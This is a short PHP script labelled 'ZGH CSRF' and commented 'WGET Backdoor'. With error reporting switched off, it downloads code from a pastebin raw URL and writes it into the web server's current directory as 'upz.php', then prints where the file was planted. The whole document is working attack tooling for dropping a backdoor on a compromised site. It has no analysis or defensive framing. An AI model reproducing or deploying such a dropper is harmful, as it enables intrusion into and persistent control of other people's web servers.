<?php
//-----------------------------------------------------------------------
//                         ZGH CSRF
//-----------------------------------------------------------------------
error_reporting(0);
$filename="upz.php";
$fget=file_get_contents("https://pastebin.com/raw/S2GRZnfC");
// WGET Backdoor
$path=getcwd().DIRECTORY_SEPARATOR;
$fileopen=fopen("$path/$filename",'w');  
$execfile=fwrite($fileopen,$fget);
	if($execfile)
	{
		echo "Success: $path$filename";
	}
	else {
		echo "Failed execute newfile $filename in $path";
	}
// EOF
?>
